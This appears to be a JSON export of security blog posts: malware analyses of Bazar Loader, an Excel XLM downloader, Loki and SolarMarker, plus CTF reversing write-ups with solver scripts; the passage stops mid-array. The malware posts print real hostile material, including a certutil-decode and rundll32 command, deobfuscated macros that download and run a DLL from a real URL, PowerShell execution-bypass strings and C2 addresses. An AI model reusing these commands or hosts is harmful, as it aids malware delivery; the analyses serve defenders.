[ { "title": "Bazar Loader", "url": "/posts/Bazar_Loader/", "categories": "Malware, Downloader", "tags": "real_sample, excel, xlsb, macro, dll, upx, unpacking", "date": "2023-06-06 19:00:00 +0300", "snippet": "First StageFile InfoFile Type: Microsoft Excel 2007+MD5: 3b409c892001c72d4b1be7786cedf010File Size: 290KBAnalysisRun oleid show no VBA macros or xml macrosTry to open the file Microsoft excelIt show a social engineering message to make the victim click on enable contentAnd one sheet is visible but click right click on the sheet name show a menu with option to unhide sheetsnow all sheets are visible and we can go to the auto_open cellthe auto open is on sheet 7 and start from A1 CellBut this sheet is protect by a password and canâ€™t show display the hidden columns but using a small trick we can see the macro without breaking the password of the file using the arrow to navigate the column cell by cellat cell A11as the name say it will save a copy of the sheet at C:\\Users\\Public\\105011.oopand at cell A35it will make another copy at C:\\Users\\Public\\105011.xlsbThen unhide from sheetand wait for 5 secondsThen runs this commandcall(&#39;Kernel32&#39;, &#39;WinExec&#39;, &#39;JCJ&#39;, &#39;cmd.exe /c certutil -decode %PUBLIC%\\133542.oop %PUBLIC%\\133542.gof &amp;amp;&amp;amp; rundll32.exe %PUBLIC%\\105011.gof,DF&#39;)ProcMonnow enable content while running procmon to monitor all the file activityHere is the first file .oopAnd the second one .xlsbAnd the process create to decode itRundll processnow this all for the file move the analysis to the dllSecond StageFile InfoFile Type: 32bit DLLDll_Exports: DF1Open the DLL in pestudionotice a UPX section names and a self modifying sectionUnpackingUnpacking using upxupx -d stage2.dll -o stage2-unpacked.dllNow open the unpacked file in pestudio and looking at imports and strings no clear strings are found in the samplelook at the file in detect it easythe entropy indicate that the file maybe still packed and need to be unpacked againto start the unpack first change the ASLR to false at pestudioto prevent the address from changing while debugginglooking at the file at ida at get the address of DF1 at 1000106Aload the file at x32dbg and from settings -&amp;gt; preferenceset breakpoint at DLL entrynow hit run f9 to hit the entrypoint of the dll then change the EIP to DF1 addressNow hit ctrl + g and search for virtualAllocthen follow the jump and set a breakpoint at the returnand set breakpoint at virtual protect using bp VirtualProtect at command barand now we are ready to hit runfirst breakpoint to hit at virtualAllocRight click on EAX and follow at dump onehit run againwe hit the same breakpointFollow EAX at dump2 and hit runand again the same breakpoint but this time we could notice that the dump2 contains an exe start with MZ magic bytesnow i will follow dump2 address at memory map and right click on it and save memory to filenow checking it using pestudio libraries include ws2_32.dlland imported function contains network related functionsand finally stringsAnalysisLoad the file into IDAAt DLLEntryPoint it will call sub_100011A0Now in this function it will start by dynamically loading libraries and resolve function address then call another 2 functionsFirst one will create directory at C:\\ProgramData\\erihdsNow return to the next functionIt have what seems like a URL and a file path, and it will call sub_10001640 twiceTake a look at sub_10001640start by calling sub_10001470 and pass to it the urlAt this function it will take a url and extract the port, domain name, and pathnow back to previous functionit will prepare an HTTP request to the url with content as ping and send itthen it will start recv all the contentand sub_100013A0 will remove any extra newlinesback to sub_100010B0 it will call sub_10001640 twice one to get the url and the second to download a pe fileAfter it download the PE it will call sub_10001350 and sub_100012B0First function will save the buffer to the path we found beforeAnd the second will execute itIoCHost BasedFilesC:\\Users\\Public\\&amp;lt;RANDOM_NUMBER&amp;gt;.oopC:\\Users\\Public\\&amp;lt;RANDOM_NUMBER&amp;gt;.xlsbC:\\Users\\Public\\&amp;lt;RANDOM_NUMBER&amp;gt;.gofC:\\ProgramData\\erihds\\erihds.exeDirsC:\\ProgramData\\erihds\\Network Basedhttp://idea5.xyz/campo/id/id8" }, { "title": "Excel Downlaoder", "url": "/posts/Excel_Downloader/", "categories": "Malware, Downloader", "tags": "real_sample, excel, xlm, macro", "date": "2023-05-18 19:00:00 +0300", "snippet": "#xls #malware #macros #xlm_macros #downloaderBasic infoMD5: d7468f3bfae912928bdf3b8ddc0d8ff9file info: Composite Document File V2 Document, Little Endian, Os: Windows, Version 10.0, Code page: 1252, Author: vlcqBjjWJkHThPgSWv, Last Saved By: Company, Name of Creating Application: Microsoft Macintosh Excel, Create Time/Date: Mon Nov 23 13:55:34 2020, Last Saved Time/Date: Mon Nov 23 14:13:13 2020AnalysisWe start by a excel fileChecking it using oleidthe file contains a xlm macrosNow open the file in excel and make sure that macros not enablednotice that the file contains 2 sheets and it has a social engineering message to make the user enable macrosopen the second sheet and go to the auto_open cellthis will be the start of xlm macrosnow i will continue as static analysis without running the macro just for my personal training i will copy all the codes to vs code and start manual deobfuscationit is clear that it will start build up strings like this urlurl = &quot;https://tophomedesignz.com/sport.dll&quot;cmd = &quot;C:\\rxtGJXs\\uEOIlCU\\URLdaxT.dll,DllRegisterServer&quot;path = &quot;C:\\rxtGJXs\\uEOIlCU\\URLdaxT.dll&quot;urlmon = &quot;URLMON&quot;downloadtofile = &quot;URLDownloadToFileA&quot;shell32 = &quot;Shell32&quot;shell_exec =&quot;ShellExecuteA&quot;open = &quot;Open&quot;CJyenomr = &quot;regsvr32.exe&quot;rundll32 = &quot;rundll32.exe&quot;dir1 = &quot;C:\\rxtGJxs&quot;subdir1 = &quot;C:\\rxtGJxs\\uEOIlCU&quot;krnl32 = &quot;kernel32&quot;mkdir = &quot;CreateDirectoryA&quot;QRbytXZ = &quot;INSEGN&quot;CIbjZFzB = &quot;DownloadFile&quot;cHFnbvmd = &quot;zbaqgiaz&quot;dGZFcuHu = &quot;BLttghIR&quot;BMdezBL = &quot;YSKhEnyF&quot;JCJ = &quot;JCJ&quot;JJCCJJ = &quot;JJCCJJ&quot;JJCCCCJ = &quot;JJCCCCJ&quot;=CALL(krnl32,mkdir,JCJ,dir1,0)=CALL(krnl32,mkdir,JCJ,subdir1,0)=CALL(urlmon,downloadtofile,JJCCJJ,0,URL,path,0,0)=CALL(shell32,shell_exec,JJCCCCJ,0,open,rundll32,cmd,0,0)=HALT()The excel file will do the following: create a directory C:\\rxtGJxs\\uEOIlCU download the dll from https://tophomedesignz.com/sport.dll at C:\\rxtGJXs\\uEOIlCU\\URLdaxT.dll run the dll C:\\rxtGJXs\\uEOIlCU\\URLdaxT.dll,DllRegisterServerIoCHost Based IoCDLL location C:\\rxtGJXs\\uEOIlCU\\URLdaxT.dllNetwork Based IoCURL https://tophomedesignz.com/sport.dll" }, { "title": "Unpaking Loki", "url": "/posts/Unpacking_Loki/", "categories": "Malware, Unpacking", "tags": "real_sample, exe, Loki, 0x32dbg", "date": "2023-05-12 19:00:00 +0300", "snippet": "Initial AssessmentSample Info:MD5: b66eb4bcb2860ef48afbc1378e1ae545File Type: PE32Compiler Time Stamp: 2016-03-29 23:03:35Sectionscontains abnormal section nameImportsa lot of suspicious imports related to registries and internet connection but nothing related to cryptographyStrings and ResourcesNo important strings or resources was found in the sampleEntropyAnd now we sure that the sample is packedUnpacking using x32gdbStart by adding break point at virtualalloc and virtualprotectbp VirtualAllocbp VirtualProtectand hit run f9 to get to the entrypoint and once more to hit one of our breakpointsIt hit VirtualAlloci will follow the jump to change the breakpoint of the VirtualAlloc from the beginning to the ret statementnow when the breakpoint is hit Imgswe can right click on the address and follow it in Memory Dump 1Then hit run again now and the same break point in triggered again when when looking at Dump 1Dump 1 looks like it contains a shellcode follow the new address at Dump 2 and hit runand the scenario repeat itself new memory is allocated and Dump 2 filled with some bytes that maybe a shellcodefollow the new memory at Dump 3 and run and again new memory and the old is filled with same data as Dump 2follow new memory at Dump 4 and runand now a new memory to allocate but the old memory is not written yet hit a run again it allocate a new memory the same address as the one we follow in Dump 4 so maybe this region was freed in the middle of the executionfollow the new address at Dump 1 and runnow we hit virtual protectand the memory at Dump 1 is filled with PE Filenow we can right click on the address and follow in memory mapand from memory map right click and dump to fileNow if we look at the unpacked file it is a valid PE32 file and contains more suspicious strings and imports" }, { "title": "SolarMarker", "url": "/posts/SolarMarker/", "categories": "Malware, stealer", "tags": "real_sample, .net, dll", "date": "2023-05-09 19:00:00 +0300", "snippet": "Initial assessmentUsing pestudioMD5: ed629af9a127724d64185a26d00ae62dFile type: 32bit .NET DLLCompiler stamp: Mon Feb 22 17:24:02 2021 | UTCentry point: 0x0002BECEImportssome imports flagged by pestudio that are related to security, reconnaissance and network.DLL_ExportsNo ExportsStringsSome interesting strings include like function names and possible C2 IPGetEnvironmentVariableGetEnvironmentVariableToBase64StringFromBase64StringToBase64StringFromBase64StringGetComputerNameGetUserNameGetComputerNameGetUserNamePOSTHttpWebRequestHttpWebRequestWriteAllTextWriteAllBytesWriteAllTextWriteAllBytesProcessProcessWMIRunsetgetaddSelectStartCreateWriteDeleteAddReplaceSelectStartCreateWriteDeleteReplacepowershellhttp://5.254.118.242GetWorkGroupHexToStringGetWinVersionGenRandomStringEncryptXorEncryptStrDecryptRawDecryptStrDestAddrSymmetricKeyWin32_ComputerSystem.Name=&#39;{0}&#39; WorkgroupWorkgroupNT 3.51NT 4.02000Vista8.1Windows 0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZuserprofileapplication/json{&quot;action&quot;:&quot;ping&quot;,&quot;&quot;:&quot;&quot;,&quot;pc_name&quot;:&quot;&quot;,&quot;os_name&quot;:&quot;&quot;,&quot;arch&quot;:&quot;x86x64&quot;,&quot;rights&quot;:&quot;UserAdmin&quot;,&quot;version&quot;:&quot;&quot;,&quot;,&quot;protocol_version&quot;:1,&quot;__waste__&quot;:&quot;statusfiletask_idtypeexeps1temp{&quot;action&quot;:&quot;get_file&quot;,&quot;hwid&quot;:&quot;&quot;,&quot;task_id&quot;:&quot;&quot;,&quot;protocol_version&quot;: 1,&quot;__waste__&quot;:&quot;{&quot;action&quot;:&quot;change_status&quot;,&quot;hwid&quot;:&quot;&quot;,&quot;is_success&quot;:true,&quot;protocol_version&quot;:1,&quot;__waste__&quot;:&quot;-ep bypass -command &quot;iex(get-content &#39; &#39;)&quot; command&#39;)&quot;commandcommand-ep bypass -command &quot;&quot;\\AppData\\Roaming\\solarmarker.datStatic Analysisopen the file in dnspy, at Namespce Z and Class Zfrom the first look noticed that the sample contain the same block of code that create a process which will do nothing related to the sample and this make the analysis harderSo i used de4do but it didnâ€™t solve this problem so i copied the code to a text editor and using some regex to clean it up and remove all the unwanted codeStart our analysis at the Run methodit call Z.Configuration and Z.GetHWIDnow this is the same url found in strings and Symmetric key will be used for encryption/decryption of the C2 communicationand the GetHWID get the value from the file at path and if not found it will create it and set it to 32bytes of random chars this a strong host based IoCcontinue the Run function it start collection info about the infected device and format at in a string like jsonstring data2 = string.Concat(new string[]{&quot;{\\&quot;action\\&quot;:\\&quot;ping\\&quot;,\\&quot;&quot;,&quot;hwid&quot;,&quot;\\&quot;:\\&quot;&quot;,hwid,&quot;\\&quot;,\\&quot;pc_name\\&quot;:\\&quot;&quot;,Z.GetComputerName(),&quot;\\&quot;,\\&quot;os_name\\&quot;:\\&quot;&quot;,Z.GetWinVersion(),&quot;\\&quot;,\\&quot;arch\\&quot;:\\&quot;&quot;,Z.Is64x() ? &quot;x64&quot; : &quot;x86&quot;,&quot;\\&quot;,\\&quot;rights\\&quot;:\\&quot;&quot;,Z.IsAdmin() ? &quot;Admin&quot; : &quot;User&quot;,&quot;\\&quot;,\\&quot;version\\&quot;:\\&quot;&quot;,configuration.AppVer,&quot;\\&quot;,\\&quot;&quot;,&quot;workgroup&quot;,&quot;\\&quot;:\\&quot;&quot;,Z.GetWorkGroup(),&quot; | &quot;,&quot;win32_computersystem&quot;,&quot;domain&quot;,&quot;\\&quot;,\\&quot;&quot;,&quot;dns&quot;,&quot;\\&quot;:&quot;,(Z.WMI(&quot;win32_computersystem&quot;, &quot;partofdomain&quot;).ToLower() == &quot;false&quot;) ? &quot;0&quot; : &quot;1&quot;,&quot;,\\&quot;protocol_version\\&quot;:1,\\&quot;__waste__\\&quot;:\\&quot;&quot;,Z.GenRandomString(random.Next(512)),&quot;\\&quot;}&quot;});names of the function are exactly what they are doing so no need to explainImage 6then it will encrypt the string using EncryptStr and send it to the C2 using Req and decrypt the response using DecryptStr and convert it to jsonImage 7Image 8the encryption and decryption are simple xor and base64 conversionImage 9and the Req sends a post request to the C2 and get the responseImage 10now if the response status is ps1 it will write poweshell file and execute it in a new processthe respond with the status success whether the file run or notImage 11and if status is exe it will write an exe file and run it the same idea as ps1Image 12and if status is command it will run a PS command without writing it to a fileImage 13and if the C2 is down will do to the next IP but in our case it only have one IP and sleep for at least 20 secondsIoCHost Based IoCFile at &amp;lt;USER_PROFILE&amp;gt;\\AppData\\Roaming\\solarmarker.datNetwork Based IoCIP 5.254.118.242" }, { "title": "SHELL CTF - rev/Tea [268]", "url": "/posts/SHELL_Tea/", "categories": "CTF, writeup", "tags": "reverse", "date": "2022-08-14 18:00:00 +0200", "snippet": "SHELL CTF 2022A beginner-friendly CTF, Hosted By S.H.E.L.LWe got the 11 position on the scoreboard under team name 0xCha0sAnd got first blood on this challange ;)teaanalyzing the main function it ask the user for the flag then call another 4 functionsaddSugar();addTea();addMilk();strainAndServe();walking threw each one of the themaddSugarspilt odd index chars from the even index chars then concatinate them togetheraddTeawill perform some kind of subtraction encryptionaddMilkwill split the string and concatinate it with diffrent orderstrainAndServecheck if the result is correctwriting python script to reverse all of thisenc_flag = [104, 108, 96, 99, 78, 89, 101, 96, 93, 109, 37, 53, 48, 103, 89, 104, 117, 103, 111, 119, 126, 51, 52, 105, 82, 59, 99, 114, 99, 55, 53, 105]for i in range(32 &amp;gt;&amp;gt; 1): enc_flag[i] -= 3 * int(i / -2)for i in range(32 &amp;gt;&amp;gt; 1, len(enc_flag)): enc_flag[i] -= int(i / 6)flag_l = enc_flag[0: len(enc_flag) // 2]flag_r = enc_flag[len(enc_flag) // 2:]flag = &#39;&#39;for i in range(16): flag += chr(flag_r[i]) + chr(flag_l[i])print(flag)flag shellctf{T0_1nfiNi7y_4nD_B3y0nd}" }, { "title": "SHELL CTF - rev/One [392]", "url": "/posts/SHELL_One/", "categories": "CTF, writeup", "tags": "reverse", "date": "2022-08-14 18:00:00 +0200", "snippet": "SHELL CTF 2022A beginner-friendly CTF, Hosted By S.H.E.L.LWe got the 11 position on the scoreboard under team name 0xCha0sOneis this challenge we have a binary file and after decompilation, we got the encryption algorithmint __cdecl main(int argc, const char **argv, const char **envp){ int v4; // [rsp+Ch] [rbp-604h] int i; // [rsp+10h] [rbp-600h] int j; // [rsp+14h] [rbp-5FCh] int v7; // [rsp+18h] [rbp-5F8h] int v8; // [rsp+1Ch] [rbp-5F4h] int v9; // [rsp+20h] [rbp-5F0h] int v10; // [rsp+24h] [rbp-5ECh] int k; // [rsp+28h] [rbp-5E8h] int v12; // [rsp+2Ch] [rbp-5E4h] int m; // [rsp+30h] [rbp-5E0h] int v14; // [rsp+34h] [rbp-5DCh] int v15; // [rsp+34h] [rbp-5DCh] int v16; // [rsp+38h] [rbp-5D8h] int n; // [rsp+3Ch] [rbp-5D4h] int v18[197]; // [rsp+40h] [rbp-5D0h] BYREF char s1[8]; // [rsp+356h] [rbp-2BAh] BYREF __int16 v20; // [rsp+35Eh] [rbp-2B2h] char s[352]; // [rsp+360h] [rbp-2B0h] BYREF __int64 v22[37]; // [rsp+4C0h] [rbp-150h] BYREF int v23; // [rsp+5E8h] [rbp-28h] unsigned __int64 v24; // [rsp+5F8h] [rbp-18h] v24 = __readfsqword(0x28u); __isoc99_scanf(&amp;amp;unk_2020, s, envp); v4 = 0; for ( i = 0; i &amp;lt; strlen(s); ++i ) { for ( j = s[i]; j &amp;gt; 0; j /= 2 ) s[v4++ + 48] = j % 2 + 48; while ( (v4 &amp;amp; 7) != 0 ) s[v4++ + 48] = 48; } s[v4 + 48] = 0; v7 = 2; memset(v22, 0, sizeof(v22)); v23 = 0; v8 = 0; v9 = 0; while ( v9 &amp;lt; v4 ) { *(_QWORD *)s1 = 0LL; v20 = 0; v10 = 0; for ( k = 0; k &amp;lt; v7 &amp;amp;&amp;amp; v4 &amp;gt; v9 + k; ++k ) { s1[k] = s[v9 + 48 + k]; ++v10; } switch ( v10 ) { case 1: if ( !strcmp(s1, &quot;0&quot;) ) { *((_BYTE *)v22 + v8) = 97; } else if ( !strcmp(s1, &quot;1&quot;) ) { *((_BYTE *)v22 + v8) = 98; } break; case 2: if ( !strcmp(s1, &quot;00&quot;) ) { *((_BYTE *)v22 + v8) = 99; } else if ( !strcmp(s1, &quot;01&quot;) ) { *((_BYTE *)v22 + v8) = 100; } else if ( !strcmp(s1, &quot;10&quot;) ) { *((_BYTE *)v22 + v8) = 101; } else if ( !strcmp(s1, &quot;11&quot;) ) { *((_BYTE *)v22 + v8) = 102; } break; case 3: if ( !strcmp(s1, &quot;000&quot;) ) { *((_BYTE *)v22 + v8) = 49; } else if ( !strcmp(s1, &quot;001&quot;) ) { *((_BYTE *)v22 + v8) = 50; } else if ( !strcmp(s1, &quot;010&quot;) ) { *((_BYTE *)v22 + v8) = 51; } else if ( !strcmp(s1, &quot;011&quot;) ) { *((_BYTE *)v22 + v8) = 52; } else if ( !strcmp(s1, &quot;100&quot;) ) { *((_BYTE *)v22 + v8) = 53; } else if ( !strcmp(s1, &quot;101&quot;) ) { *((_BYTE *)v22 + v8) = 54; } else if ( !strcmp(s1, &quot;110&quot;) ) { *((_BYTE *)v22 + v8) = 55; } else if ( !strcmp(s1, &quot;111&quot;) ) { *((_BYTE *)v22 + v8) = 56; } break; default: *((_BYTE *)v22 + v8) = 57; break; } v9 += v10; ++v8; v7 = (v7 + 1) % 4; } v12 = 0; for ( m = 0; m &amp;lt; v8; m += 2 ) { if ( *((char *)v22 + m + 1) &amp;lt;= 47 || *((char *)v22 + m + 1) &amp;gt; 57 ) v14 = *((char *)v22 + m + 1) - 97; else v14 = *((char *)v22 + m + 1) - 48; if ( *((char *)v22 + m) &amp;lt;= 47 || *((char *)v22 + m) &amp;gt; 57 ) v15 = 16 * (*((char *)v22 + m) - 97) + v14; else v15 = 16 * (*((char *)v22 + m) - 48) + v14; v18[v12++ + 96] = v15; } qmemcpy(v18, &quot;R&quot;, 0x174uLL); v16 = 0; for ( n = 0; n &amp;lt;= 78; ++n ) { if ( v18[n] == v18[n + 96] ) ++v16; } if ( v16 == 79 ) puts(&quot;you&#39;re good at this!&quot;); else puts(&quot;nope, that&#39;s not it.&quot;); return 0;}that by create a reveres script for it you got the flagarr = [0x52,0x91,0x41,0x91,0x36,0x90,0x44,0x90,0x27,0x91,0x42,0x91,0x36,0x91,0x24,0x90,0x26,0x91,0x44,0x90,0x36,0x91,0x38,0x90,0x52,0x91,0x41,0x90,0x52,0x90,0x52,0x90,0x45,0x91,0x48,0x91,0x45,0x91,0x24,0x90,0x26,0x91,0x27,0x90,0x46,0x91,0x27,0x90,0x58,0x90,0x47,0x90,0x35,0x90,0x27,0x90,0x37,0x91,0x44,0x90,0x46,0x90,0x44,0x90,0x32,0x91,0x46,0x90,0x52,0x90,0x27,0x90,0x57,0x91,0x44,0x91,0x36,0x90,0x47,0x90,0x58,0x90,0x42,0x90,0x52,0x91,0x56,0x90,0x46,0x90,0x46,0x91,0x54]lookup_table = { 97:&quot;0&quot;, 98:&quot;1&quot;, 99:&quot;00&quot;, 100:&quot;01&quot;, 101:&quot;10&quot;, 102:&quot;11&quot;, 49:&quot;000&quot;, 50:&quot;001&quot;, 51:&quot;010&quot;, 52:&quot;011&quot;, 53:&quot;100&quot;, 54:&quot;101&quot;, 55:&quot;110&quot;, 56:&quot;111&quot;,}c = 2bits = &#39;&#39;for i in arr: m = [i // 16, i % 16] for j in range(2): if c == 2: m[j] = m[j] + 97 elif c == 3: m[j] = m[j] + 48 elif c == 1: m[j] = m[j] + 97 elif c == 0: m[j] = 57 c = (c + 1) % 4 continue bits += lookup_table[m[j]] c = (c + 1) % 4flag_bytes = [bits[i:i+8] for i in range(0, len(bits), 8)]flag = &#39;&#39;.join(chr(int(i[::-1],2)) for i in flag_bytes)print(flag)flag shellctf{s0Me_b4S3_c0nVer51on5_4_U}" }, { "title": "ASCWG - rev/Unpacking 1337 [900]", "url": "/posts/ASCWG_1337/", "categories": "CTF, writeup", "tags": "reverse", "date": "2022-08-08 18:00:00 +0200", "snippet": "Arab Security Cyber Wargames QualificationUnpacking 1337The challenge is an elf file called&amp;gt; file AkazaAkaza: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, no section headerThe file is packed and when running it asks for the flag.unpackingTo unpack it I start by running the binary and then attaching ida debuggerthen inspect the stack and noticed what could be a return addressfollowing this address in hex view found the unpacked elf at address 0x800000000![[1.png]]IDA Stackreverse__int64 sub_7AA(){ __int64 result; // rax int v1; // [rsp+10h] [rbp-880h] int v2; // [rsp+14h] [rbp-87Ch] int v3; // [rsp+18h] [rbp-878h] int i; // [rsp+1Ch] [rbp-874h] _DWORD v5[12]; // [rsp+20h] [rbp-870h] BYREF _DWORD v6[20]; // [rsp+50h] [rbp-840h] BYREF _BYTE v7[208]; // [rsp+A0h] [rbp-7F0h] BYREF _BYTE v8[1816]; // [rsp+170h] [rbp-720h] BYREF unsigned __int64 v9; // [rsp+888h] [rbp-8h] v9 = __readfsqword(0x28u); memset(v6, 0, sizeof(v6)); v1 = 0; memset(v5, 0, 40); memset(v7, 0, 0xC8uLL); qmemcpy(v8, qword_1320, 0x70AuLL); v2 = 0; v3 = 0; sub_640(); sub_680(); for ( i = 0; i &amp;lt;= 9; ++i ) { v5[i] = 0; v5[i] |= (unsigned __int8)v7[4 * i + 3] &amp;lt;&amp;lt; 24; v5[i] |= (unsigned __int8)v7[4 * i + 2] &amp;lt;&amp;lt; 16; v5[i] |= (unsigned __int8)v7[4 * i + 1] &amp;lt;&amp;lt; 8; v5[i] |= (unsigned __int8)v7[4 * i]; } if ( sub_650() == 40 ) { while ( 2 ) { switch ( v8[v1] ) { case 1: v6[(unsigned __int8)v8[v1 + 1]] += (unsigned __int8)v8[v1 + 2]; v1 += 3; goto LABEL_31; case 2: v6[(unsigned __int8)v8[v1 + 1]] -= (unsigned __int8)v8[v1 + 2]; v1 += 3; goto LABEL_31; case 3: v6[(unsigned __int8)v8[v1 + 1]] *= (unsigned __int8)v8[v1 + 2]; v1 += 3; goto LABEL_31; case 4: v6[(unsigned __int8)v8[v1 + 1]] /= (unsigned int)(unsigned __int8)v8[v1 + 2]; v1 += 3; goto LABEL_31; case 5: v6[(unsigned __int8)v8[v1 + 1]] &amp;gt;&amp;gt;= v8[v1 + 2]; v1 += 3; goto LABEL_31; case 6: v6[(unsigned __int8)v8[v1 + 1]] &amp;lt;&amp;lt;= v8[v1 + 2]; v1 += 3; goto LABEL_31; case 7: v6[(unsigned __int8)v8[v1 + 1]] += v6[(unsigned __int8)v8[v1 + 2]]; v1 += 3; goto LABEL_31; case 8: v6[(unsigned __int8)v8[v1 + 1]] -= v6[(unsigned __int8)v8[v1 + 2]]; v1 += 3; goto LABEL_31; case 9: v6[(unsigned __int8)v8[v1 + 1]] *= v6[(unsigned __int8)v8[v1 + 2]]; v1 += 3; goto LABEL_31; case 0xA: v6[(unsigned __int8)v8[v1 + 1]] /= v6[(unsigned __int8)v8[v1 + 2]]; v1 += 3; goto LABEL_31; case 0xB: v6[(unsigned __int8)v8[v1 + 1]] &amp;gt;&amp;gt;= v6[(unsigned __int8)v8[v1 + 2]]; v1 += 3; goto LABEL_31; case 0xC: v6[(unsigned __int8)v8[v1 + 1]] &amp;lt;&amp;lt;= v6[(unsigned __int8)v8[v1 + 2]]; v1 += 3; goto LABEL_31; case 0xD: v6[(unsigned __int8)v8[v1 + 1]] ^= v6[(unsigned __int8)v8[v1 + 2]]; v1 += 3; goto LABEL_31; case 0xE: v6[(unsigned __int8)v8[v1 + 1]] &amp;amp;= v6[(unsigned __int8)v8[v1 + 2]]; v1 += 3; goto LABEL_31; case 0xF: v6[(unsigned __int8)v8[v1 + 1]] |= v6[(unsigned __int8)v8[v1 + 2]]; v1 += 3; goto LABEL_31; case 0x10: v6[(unsigned __int8)v8[v1 + 1]] = v5[(unsigned __int8)v8[v1 + 2]]; v1 += 3; goto LABEL_31; case 0x11: if ( v6[(unsigned __int8)v8[v1 + 1]] == v6[(unsigned __int8)v8[v1 + 2]] ) ++v3; v1 += 3; goto LABEL_31; case 0x12: if ( v3 == 50 ) sub_670(); else sub_640(); result = 1LL; break; default: v2 = 1;LABEL_31: if ( !v2 ) continue; result = 1LL; break; } break; } } else { sub_640(); result = 1LL; } if ( __readfsqword(0x28u) != v9 ) return sub_660(); return result;}when decompiling the unpacked file we still have to reverse this encryptiona python z3 script will do the trickfrom z3 import *x0 = BitVec(&#39;x0&#39;, 32)x1 = BitVec(&#39;x1&#39;, 32)x2 = BitVec(&#39;x2&#39;, 32)x3 = BitVec(&#39;x3&#39;, 32)x4 = BitVec(&#39;x4&#39;, 32)x5 = BitVec(&#39;x5&#39;, 32)x6 = BitVec(&#39;x6&#39;, 32)x7 = BitVec(&#39;x7&#39;, 32)x8 = BitVec(&#39;x8&#39;, 32)x9 = BitVec(&#39;x9&#39;, 32)s = Solver()s.add(x1 ^ x0 == 1662461958)s.add(x4 ^ x2 == 83907589)s.add(x8 + x0 == 2444723369)s.add(x4 &amp;amp; x0 == 289620800)s.add(x5 ^ x2 == 1516982324)s.add(x8 &amp;amp; x7 == 439619872)s.add(x3 &amp;amp; x7 == 288641811)s.add(x1 &amp;amp; x1 == 877951815)s.add(x1 + x8 == 1858645167)s.add(x9 &amp;amp; x3 == 824254729)s.add(x1 | x4 == 895450991)s.add(x8 &amp;amp; x5 == 708059464)s.add(x1 | x5 == 2121562975)s.add(x4 &amp;amp; x1 == 810836806)s.add(x8 | x9 == 2138386793)s.add(x8 | x8 == 980693352)s.add(x3 + x9 == 2929235080)s.add(x8 ^ x6 == 1363166519)s.add(x9 &amp;amp; x0 == 1426129153)s.add(x3 ^ x2 == 86523956)s.add(x9 + x8 == 3080016529)s.add(x1 ^ x6 == 1600130840)s.add(x2 &amp;amp; x8 == 810824040)s.add(x3 ^ x1 == 86181912)s.add(x5 ^ x0 == 964112414)s.add(x7 + x6 == 3395867538)s.add(x9 &amp;amp; x8 == 941629736)s.add(x3 | x9 == 2104980351)s.add(x2 + x6 == 2677254090)s.add(x3 + x2 == 1708566218)s.add(x6 &amp;amp; x4 == 554984526)s.add(x8 &amp;amp; x9 == 941629736)s.add(x1 | x7 == 2138341239)s.add(x6 | x5 == 1865709407)s.add(x2 + x3 == 1708566218)s.add(x8 ^ x2 == 237699587)s.add(x6 ^ x9 == 370496886)s.add(x5 ^ x0 == 964112414)s.add(x5 ^ x4 == 1600848945)s.add(x9 ^ x8 == 1196757057)s.add(x2 &amp;amp; x0 == 339940161)s.add(x1 ^ x2 == 739372)s.add(x8 ^ x7 == 1698721371)s.add(x2 + x3 == 1708566218)s.add(x3 | x9 == 2104980351)s.add(x3 | x8 == 997684095)s.add(x4 ^ x2 == 83907589)s.add(x7 &amp;amp; x8 == 439619872)s.add(x5 | x6 == 1865709407)s.add(x5 &amp;amp; x6 == 1781817439)print(s.model())[x9 = 2099323177,x4 = 828335982,x5 = 1848927071,x6 = 1798599775,x7 = 1597267763,x3 = 829911903,x2 = 878654315,x8 = 980693352,x1 = 877951815,x0 = 1464030017]convert bytes to chars and reorder themflag ASCWG{T4k3_4_sw1ng_1_c4n_t4k3_4_h1t:)!!}" }, { "title": "LIT CTF - rev/minimalist", "url": "/posts/litctf-minimalist/", "categories": "CTF, writeup", "tags": "reverse", "date": "2022-07-24 18:00:00 +0200", "snippet": "Lexington Informatics Tournament CTF 2022 - rev/minimalistLexington Informatics Tournament CTF 2022 was held from the 22nd of July Until the 25th of the month, and we have participated under the team 0xcha0s, we have managed to solve multiple challenges. this challenge was solved 53 times in the 3 days.Discovering the binaryWe are given a binary using file command reveals it is an x64bit ELF executable.Opening the file in IDA and decompiling the decompiled function looked wired and missing instructions compared to the assemblyAnd trying ghidra shows a better result on decompilationThe code can be broke to 3 sections: Take the flag from user Doing some operations on the data check if it is a valid flagSo let us dive into each one of thoseInputting the flagputs(&quot;Enter the flag: &quot;);for (i = 0; i &amp;lt; 0x2f; i++) { flag_char = getchar(); if (i == 0) { *(array + -8) = flag_char; array -= 8; } *(array + -8) = *(&amp;amp;first_arry + i * 8); *(array + -0x10) = *(&amp;amp;second_arry + i * 8); *(array + -0x18) = flag_char;}Cleaning the section and analysing it. the input is 47 char length string. the first char will be stored twice, and for each input char, it wil store the char after 2 bytes from 2 arrays on data section.the result of this part is an array where each 3 bytes on this format &amp;lt;first array byte&amp;gt; &amp;lt;second array byte&amp;gt; &amp;lt;flag_char&amp;gt;Processing the flagCleaning the code and it reveals a simple operation using each 3bytes from the result of the last partnot_flag = 0;for (j = 0; j &amp;lt; 0x2f; j = j + 1) { n_1 = array[1]; n_2 = array[2]; n_3 = array[3]; res = ~(n_1 | ~n_3) | ~(~n_1 | n_3); not_flag = not_flag | ~(~res | ~n_2) | ~(res | n_2); array = array + 3;}last_char = *array;value = 0xffffffffffffff82;not_flag = not_flag | ~(last_char | value) | ~(~value | ~last_char);Flag checkIt will check if the result of the prevouis part is zeroif (not_flag == 0) { puts(&quot;The flag is correct.&quot;);} else { puts(&quot;Wrong flag!&quot;);}Solve dumping the 2 arrays then bute force each char of the flag the will keep not_flag equal to zero then brute force the last char#include &amp;lt;iostream&amp;gt;using namespace std;int main() { unsigned char x[] = { 0x87, 0xd3, 0xcc, 0xb5, 0x85, 0xe0, 0xc0, 0xa1, 0xf0, 0x83, 0xe4, 0xe8, 0xe4, 0x9a, 0xff, 0xf8, 0xe4, 0xdd, 0x8e, 0xda, 0xcc, 0x9f, 0xe8, 0xe8, 0xab, 0xf7, 0xb7, 0xa5, 0xe9, 0xf1, 0xec, 0xfc, 0x8a, 0x8f, 0xe7, 0xdd, 0x84, 0xca, 0xfa, 0x95, 0x87, 0xea, 0xc5, 0xa5, 0xe9, 0xb9, 0xff}; unsigned char y[] = { 0x34, 0x60, 0x7a, 0x1e, 0x39, 0x4b, 0x79, 0x25, 0x58, 0x14, 0x2b, 0x48, 